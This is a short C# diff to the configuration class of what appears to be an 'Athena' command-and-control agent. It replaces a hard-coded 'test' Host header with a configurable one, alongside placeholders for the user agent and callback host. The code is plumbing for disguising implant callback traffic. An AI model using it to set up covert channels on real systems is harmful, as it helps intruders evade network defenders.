@@ -57,7 +57,6 @@ namespace Athena.Config
             string getUri = "get_uri";
             string queryPath = "query_path_name";
             string postUri = "post_uri";
-            this.client.DefaultRequestHeaders.Host = "test";
             this.userAgent = "%USERAGENT%";
             this.hostHeader = "%HOSTHEADER%";
             this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}";
@@ -82,6 +81,11 @@ namespace Athena.Config
             }
 
             this.client = new HttpClient(handler);
+
+            if (!string.IsNullOrEmpty(this.hostHeader))
+            {
+                this.client.DefaultRequestHeaders.Host = this.hostHeader;
+            }
 
             if (!string.IsNullOrEmpty(this.userAgent))
             {
